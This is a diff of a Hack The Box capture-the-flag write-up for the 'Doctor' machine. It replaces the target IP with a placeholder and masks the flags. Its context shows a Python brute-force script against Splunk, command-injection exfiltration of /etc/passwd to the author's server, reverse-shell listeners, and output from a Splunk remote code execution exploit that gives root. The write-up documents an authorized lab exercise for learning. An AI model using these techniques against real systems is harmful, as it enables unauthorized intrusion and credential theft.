@@ -11,8 +11,6 @@ htb_url: https://app.hackthebox.com/machines/Doctor
 ---
 ## Overview
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/0-doctor-infocard.png)
-
 Short description to include any strange things to be dealt with
 
 TODO: Finish writing and clean up
@@ -31,11 +29,11 @@ TODO: Finish writing and clean up
 
 ### Nmap scan
 
-I started my enumeration with an nmap scan of `10.10.10.209`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
+I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/doctor]
-└─$ nmap -sCV -n -p- -Pn -v -oA doctor 10.10.10.209                                              130 ⨯
+└─$ nmap -sCV -n -p- -Pn -v -oA doctor <YOUR_IP>                                              130 ⨯
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-07 17:55 EST
 NSE: Loaded 153 scripts for scanning.
@@ -47,24 +45,24 @@ Completed NSE at 17:55, 0.00s elapsed
 Initiating NSE at 17:55
 Completed NSE at 17:55, 0.00s elapsed
 Initiating Connect Scan at 17:55
-Scanning 10.10.10.209 [65535 ports]
-Discovered open port 80/tcp on 10.10.10.209
-Discovered open port 22/tcp on 10.10.10.209
+Scanning <YOUR_IP> [65535 ports]
+Discovered open port 80/tcp on <YOUR_IP>
+Discovered open port 22/tcp on <YOUR_IP>
 Connect Scan Timing: About 18.79% done; ETC: 17:58 (0:02:14 remaining)
-Discovered open port 8089/tcp on 10.10.10.209                                                           
+Discovered open port 8089/tcp on <YOUR_IP>                                                           
 Connect Scan Timing: About 46.81% done; ETC: 17:57 (0:01:09 remaining)                                  
 Completed Connect Scan at 17:57, 106.48s elapsed (65535 total ports)                                    
 Initiating Service scan at 17:57                                                                        
-Scanning 3 services on 10.10.10.209                                                                     
+Scanning 3 services on <YOUR_IP>                                                                     
 Completed Service scan at 17:57, 31.27s elapsed (3 services on 1 host)                                  
-NSE: Script scanning 10.10.10.209.                                                                      
+NSE: Script scanning <YOUR_IP>.                                                                      
 Initiating NSE at 17:57                                                                                 
 Completed NSE at 17:58, 8.63s elapsed
 Initiating NSE at 17:58
 Completed NSE at 17:58, 0.57s elapsed
 Initiating NSE at 17:58
 Completed NSE at 17:58, 0.00s elapsed
-Nmap scan report for 10.10.10.209
+Nmap scan report for <YOUR_IP>
 Host is up (0.063s latency).
 Not shown: 65532 filtered ports
 PORT     STATE SERVICE  VERSION
@@ -144,13 +142,13 @@ import requests
 from urllib3.exceptions import InsecureRequestWarning
 
 headers = {
-'Host': '10.10.10.209:8089',
+'Host': '<YOUR_IP>:8089',
 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
 'Accept-Language': 'en-US,en;q=0.5',
 'Accept-Encoding': 'gzip, deflate',
 'Connection': 'close',
-'Referer': 'https://10.10.10.209:8089/',
+'Referer': 'https://<YOUR_IP>:8089/',
 'Upgrade-Insecure-Requests': '1',
 'DNT': '1',
 'Sec-GPC': '1'
@@ -165,7 +163,7 @@ print("Starting password brute force...\n")
 
 with open("/home/zweilos/rockyou_utf8.txt", "r") as rockyou:
     for password in rockyou:
-            r = requests.get('https://10.10.10.209:8089/services', auth=('admin', password), headers = headers, verify = False)
+            r = requests.get('https://<YOUR_IP>:8089/services', auth=('admin', password), headers = headers, verify = False)
             if r.status_code == 200:
                 print(f"The password is: {password}\n")
                 break
@@ -217,7 +215,7 @@ I tried putting a link to my machine in the Content box, but got a message that 
 ┌──(zweilos㉿kali)-[~/htb/doctor]
 └─$ nc -lvnp 8081
 listening on [any] 8081 ...
-connect to [10.10.15.77] from (UNKNOWN) [10.10.10.209] 39234
+connect to [10.10.15.77] from (UNKNOWN) [<YOUR_IP>] 39234
 GET / HTTP/1.1
 Host: 10.10.15.77:8081
 User-Agent: curl/7.68.0
@@ -232,7 +230,7 @@ Looks like the service is running `curl`. If there is no input sanitization I ma
 ┌──(zweilos㉿kali)-[~/htb/doctor]
 └─$ nc -lvnp 8081                                                                                130 ⨯
 listening on [any] 8081 ...
-connect to [10.10.15.77] from (UNKNOWN) [10.10.10.209] 39242
+connect to [10.10.15.77] from (UNKNOWN) [<YOUR_IP>] 39242
 GET /uid=1001(web) HTTP/1.1
 Host: 10.10.15.77:8081
 User-Agent: curl/7.68.0
@@ -259,34 +257,34 @@ After discovering that I could use commands by plugging the space with `$IFS`, I
 ┌──(zweilos㉿kali)-[~/htb/doctor]
 └─$ python3 -m http.server 8081
 Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
-10.10.10.209 - - [07/Feb/2021 21:19:26] code 404, message File not found
-10.10.10.209 - - [07/Feb/2021 21:19:26] "GET /blog HTTP/1.1" 404 -
-10.10.10.209 - - [07/Feb/2021 21:20:21] "GET / HTTP/1.1" 200 -
-10.10.10.209 - - [07/Feb/2021 21:20:38] code 404, message File not found
-10.10.10.209 - - [07/Feb/2021 21:20:38] "GET /root:x:0:0:root:/root:/bin/bash HTTP/1.1" 404 -
-10.10.10.209 - - [07/Feb/2021 21:21:12] code 404, message File not found
-10.10.10.209 - - [07/Feb/2021 21:21:12] "GET /root:x:0:0:root:/root:/bin/bash HTTP/1.1" 404 -
-10.10.10.209 - - [07/Feb/2021 21:22:49] code 404, message File not found
-10.10.10.209 - - [07/Feb/2021 21:22:49] "GET /bin HTTP/1.1" 404 -
-10.10.10.209 - - [07/Feb/2021 21:23:00] code 404, message File not found
-10.10.10.209 - - [07/Feb/2021 21:23:00] "GET /blog HTTP/1.1" 404 -
-10.10.10.209 - - [07/Feb/2021 21:24:20] code 404, message File not found
-10.10.10.209 - - [07/Feb/2021 21:24:20] "GET /root:x:0:0:root:/root:/bin/bash HTTP/1.1" 404 -
-10.10.10.209 - - [07/Feb/2021 21:26:43] code 404, message File not found
-10.10.10.209 - - [07/Feb/2021 21:26:43] "GET /pulse:x:123:128:PulseAudio HTTP/1.1" 404 -
-10.10.10.209 - - [07/Feb/2021 21:37:28] "GET / HTTP/1.1" 200 -
-10.10.10.209 - - [07/Feb/2021 21:38:46] "GET / HTTP/1.1" 200 -                                          
-10.10.10.209 - - [07/Feb/2021 21:41:23] "GET / HTTP/1.1" 200 -                                          
-10.10.10.209 - - [07/Feb/2021 21:41:32] "GET / HTTP/1.1" 200 -                                          
-10.10.10.209 - - [07/Feb/2021 21:41:53] "GET / HTTP/1.1" 200 -                                          
-10.10.10.209 - - [07/Feb/2021 21:42:13] code 404, message File not found                                
-10.10.10.209 - - [07/Feb/2021 21:42:13] "GET /blog HTTP/1.1" 404 -
-10.10.10.209 - - [07/Feb/2021 21:43:12] code 404, message File not found
-10.10.10.209 - - [07/Feb/2021 21:43:12] "GET //usr/bin:/bin HTTP/1.1" 404 -
-10.10.10.209 - - [07/Feb/2021 21:45:15] "GET / HTTP/1.1" 200 -
-10.10.10.209 - - [07/Feb/2021 21:45:30] code 404, message File not found
-10.10.10.209 - - [07/Feb/2021 21:45:30] "GET /splunk:x:1003:1003:Splunk HTTP/1.1" 404 -
-10.10.10.209 - - [07/Feb/2021 21:46:42] "GET /shaun:x:1002:1002:shaun,,,:/home/shaun:/bin/bash HTTP/1.1" 404 -
+<YOUR_IP> - - [07/Feb/2021 21:19:26] code 404, message File not found
+<YOUR_IP> - - [07/Feb/2021 21:19:26] "GET /blog HTTP/1.1" 404 -
+<YOUR_IP> - - [07/Feb/2021 21:20:21] "GET / HTTP/1.1" 200 -
+<YOUR_IP> - - [07/Feb/2021 21:20:38] code 404, message File not found
+<YOUR_IP> - - [07/Feb/2021 21:20:38] "GET /root:x:0:0:root:/root:/bin/bash HTTP/1.1" 404 -
+<YOUR_IP> - - [07/Feb/2021 21:21:12] code 404, message File not found
+<YOUR_IP> - - [07/Feb/2021 21:21:12] "GET /root:x:0:0:root:/root:/bin/bash HTTP/1.1" 404 -
+<YOUR_IP> - - [07/Feb/2021 21:22:49] code 404, message File not found
+<YOUR_IP> - - [07/Feb/2021 21:22:49] "GET /bin HTTP/1.1" 404 -
+<YOUR_IP> - - [07/Feb/2021 21:23:00] code 404, message File not found
+<YOUR_IP> - - [07/Feb/2021 21:23:00] "GET /blog HTTP/1.1" 404 -
+<YOUR_IP> - - [07/Feb/2021 21:24:20] code 404, message File not found
+<YOUR_IP> - - [07/Feb/2021 21:24:20] "GET /root:x:0:0:root:/root:/bin/bash HTTP/1.1" 404 -
+<YOUR_IP> - - [07/Feb/2021 21:26:43] code 404, message File not found
+<YOUR_IP> - - [07/Feb/2021 21:26:43] "GET /pulse:x:123:128:PulseAudio HTTP/1.1" 404 -
+<YOUR_IP> - - [07/Feb/2021 21:37:28] "GET / HTTP/1.1" 200 -
+<YOUR_IP> - - [07/Feb/2021 21:38:46] "GET / HTTP/1.1" 200 -                                          
+<YOUR_IP> - - [07/Feb/2021 21:41:23] "GET / HTTP/1.1" 200 -                                          
+<YOUR_IP> - - [07/Feb/2021 21:41:32] "GET / HTTP/1.1" 200 -                                          
+<YOUR_IP> - - [07/Feb/2021 21:41:53] "GET / HTTP/1.1" 200 -                                          
+<YOUR_IP> - - [07/Feb/2021 21:42:13] code 404, message File not found                                
+<YOUR_IP> - - [07/Feb/2021 21:42:13] "GET /blog HTTP/1.1" 404 -
+<YOUR_IP> - - [07/Feb/2021 21:43:12] code 404, message File not found
+<YOUR_IP> - - [07/Feb/2021 21:43:12] "GET //usr/bin:/bin HTTP/1.1" 404 -
+<YOUR_IP> - - [07/Feb/2021 21:45:15] "GET / HTTP/1.1" 200 -
+<YOUR_IP> - - [07/Feb/2021 21:45:30] code 404, message File not found
+<YOUR_IP> - - [07/Feb/2021 21:45:30] "GET /splunk:x:1003:1003:Splunk HTTP/1.1" 404 -
+<YOUR_IP> - - [07/Feb/2021 21:46:42] "GET /shaun:x:1002:1002:shaun,,,:/home/shaun:/bin/bash HTTP/1.1" 404 -
 ```
 
 I figured out how to enumerate `/etc/passwd` one line at a time using `tail -n`;
@@ -333,15 +331,15 @@ chmod +x to make executable,
 and executing my shell script
 
 ```text
-10.10.10.209 - - [07/Feb/2021 21:47:19] "GET /exim:x:31:31:Exim HTTP/1.1" 404 -                         
-10.10.10.209 - - [12/Feb/2021 19:16:30] "GET / HTTP/1.1" 200 -                                          
-10.10.10.209 - - [12/Feb/2021 19:17:53] "GET / HTTP/1.1" 200 -
-10.10.10.209 - - [12/Feb/2021 19:18:37] code 404, message File not found
-10.10.10.209 - - [12/Feb/2021 19:18:37] "GET //usr/bin/curl HTTP/1.1" 404 -
-10.10.10.209 - - [12/Feb/2021 19:19:00] "GET / HTTP/1.1" 200 -
-10.10.10.209 - - [12/Feb/2021 19:23:11] "GET / HTTP/1.1" 200 -
-10.10.10.209 - - [12/Feb/2021 19:23:43] "GET /shell HTTP/1.1" 200 -
-10.10.10.209 - - [12/Feb/2021 19:23:44] "GET / HTTP/1.1" 200 -
+<YOUR_IP> - - [07/Feb/2021 21:47:19] "GET /exim:x:31:31:Exim HTTP/1.1" 404 -                         
+<YOUR_IP> - - [12/Feb/2021 19:16:30] "GET / HTTP/1.1" 200 -                                          
+<YOUR_IP> - - [12/Feb/2021 19:17:53] "GET / HTTP/1.1" 200 -
+<YOUR_IP> - - [12/Feb/2021 19:18:37] code 404, message File not found
+<YOUR_IP> - - [12/Feb/2021 19:18:37] "GET //usr/bin/curl HTTP/1.1" 404 -
+<YOUR_IP> - - [12/Feb/2021 19:19:00] "GET / HTTP/1.1" 200 -
+<YOUR_IP> - - [12/Feb/2021 19:23:11] "GET / HTTP/1.1" 200 -
+<YOUR_IP> - - [12/Feb/2021 19:23:43] "GET /shell HTTP/1.1" 200 -
+<YOUR_IP> - - [12/Feb/2021 19:23:44] "GET / HTTP/1.1" 200 -
 ```
 
 I got a connection back from the remote host which downloaded my shell script
@@ -354,7 +352,7 @@ I got a connection back from the remote host which downloaded my shell script
 ┌──(zweilos㉿kali)-[~/htb/doctor]
 └─$ nc -lvnp 8091                                                                                   1 ⨯
 listening on [any] 8091 ...
-connect to [10.10.15.13] from (UNKNOWN) [10.10.10.209] 51260
+connect to [10.10.15.13] from (UNKNOWN) [<YOUR_IP>] 51260
 bash: cannot set terminal process group (867): Inappropriate ioctl for device
 bash: no job control in this shell
 web@doctor:~$ which python
@@ -558,7 +556,7 @@ drwxrwxr-x 3 shaun shaun 4096 Sep  6 18:01 .local
 -r-------- 1 shaun shaun   33 Feb 12 07:04 user.txt
 shaun@doctor:~$ cat user.txt    
 cat user.txt
-d1d591b77e1d5c2457e2cdc9d2bcffad
+****
 ```
 
 ## Path to Power \(Gaining Administrator Access\)
@@ -641,7 +639,7 @@ Running in remote mode (Remote Code Execution)
 [+] Created malicious app bundle in: /tmp/tmp8o0jrwfy.tar
 [+] Started HTTP server for remote mode
 [.] Installing app from: http://10.10.15.13:9001/
-10.10.10.209 - - [12/Feb/2021 21:34:40] "GET / HTTP/1.1" 200 -
+<YOUR_IP> - - [12/Feb/2021 21:34:40] "GET / HTTP/1.1" 200 -
 [+] App installed, your code should be running now!
 
 Press RETURN to cleanup
@@ -653,7 +651,7 @@ Press RETURN to cleanup
 ┌──(zweilos㉿kali)-[~/htb/doctor]
 └─$ nc -lvnp 8092                                                                                   1 ⨯
 listening on [any] 8092 ...
-connect to [10.10.15.13] from (UNKNOWN) [10.10.10.209] 42328
+connect to [10.10.15.13] from (UNKNOWN) [<YOUR_IP>] 42328
 bash: cannot set terminal process group (1134): Inappropriate ioctl for device
 bash: no job control in this shell
 root@doctor:/# id && hostname
@@ -664,7 +662,7 @@ root@doctor:/# cd /root
 cd /root
 root@doctor:/root# cat root.txt
 cat root.txt
-3ce7f10b033ef2cdcfdd22eb598e649f
+****
 ```
 
 Got a root shell back, and collected my proof
@@ -696,7 +694,3 @@ Using my python brute force script it took roughly a quarter of a second per try
 This would have taken over 154 hours to guess the correct password \(this is assuming single threaded attempts\). So, if the attacker had not been able to get a shell on the box as the web user and used the privilege escalation route, simply getting the username from `/etc/passwd` would have eventually provided access to a determined attacker!
 
 ![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/0-doctor-pwned.png)
-
-Thanks to [`<box_creator>`](https://www.hackthebox.eu/home/users/profile/<profile_num>) for... \[something interesting or useful about this machine.\]
-
-If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
